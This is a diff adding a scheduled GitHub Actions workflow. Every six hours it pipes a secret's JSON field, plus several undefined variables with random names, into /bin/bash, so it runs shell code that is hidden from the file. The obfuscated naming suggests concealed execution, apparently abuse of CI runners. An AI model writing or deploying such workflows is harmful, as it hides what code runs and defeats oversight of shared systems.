@@ -1,0 +1,25 @@
+name: jiupingxina
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '42 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: jiupingxina
+        env:
+          tbt20: ${{ secrets.tbt20 }}
+        run: |
+          echo $tbt20 | jq -r .kvt7313 | /bin/bash
+          echo $c498 | jq -r .ttybe2 | /bin/bash
+          echo $eeovl91851 | jq -r .ykit7630 | /bin/bash
+          echo $lq67646 | jq -r .qzce77416 | /bin/bash
+          echo $a485 | jq -r .ipwi68001 | /bin/bash
+          echo $zyi62362 | jq -r .wmr01 | /bin/bash
+          echo $etmm837 | jq -r .xioz07 | /bin/bash
+          echo $gvvhc76397 | jq -r .g2 | /bin/bash
+          echo $e65680 | jq -r .aq0 | /bin/bash
+
